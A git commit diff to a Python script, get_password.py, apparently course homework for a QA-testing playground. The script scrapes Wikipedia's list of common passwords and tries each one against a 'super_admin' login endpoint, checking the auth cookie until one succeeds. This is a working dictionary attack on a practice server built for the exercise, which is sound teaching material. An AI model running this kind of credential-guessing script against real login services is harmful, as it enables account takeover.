e80c55042c3e67b583b87c107d3685885d649fbf
Oleg Malyshev <malyshev@jivosite.com>
2022-08-25 14:16:33 +0300

    get password

--- get_password.py
+++ get_password.py
@@ -1,19 +1,27 @@
 import requests
-import justext
+from lxml import html
+
+response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
+
+tree = html.fromstring(response.text)
+
+locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
+passwords = tree.xpath(locator)
+
+for password in passwords:
+    password = str(password).strip()
+    print(password)
+    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
+                             data={"login": "super_admin", "password": password})
+    cookie = response1.cookies.values()
+    response2 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
+                             params={"auth_cookie ": cookie})
+    if response2.text != "You are NOT authorized":
+        print(response2.text)
+        print(password)
 
 
-page = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
-data = justext.justext(page.content, justext.get_stoplist("English"))
-for x in data:
-    newpass = x.text
-    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
-                             data={"login": "super_admin", "password": newpass})
-    cookie = response.cookies.values()
-    response1 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
-                              params={"auth_cookie ": cookie})
-    if response1.text != "You are NOT authorized":
-        print(response1.text)
-        print(newpass)
+
 
 
 
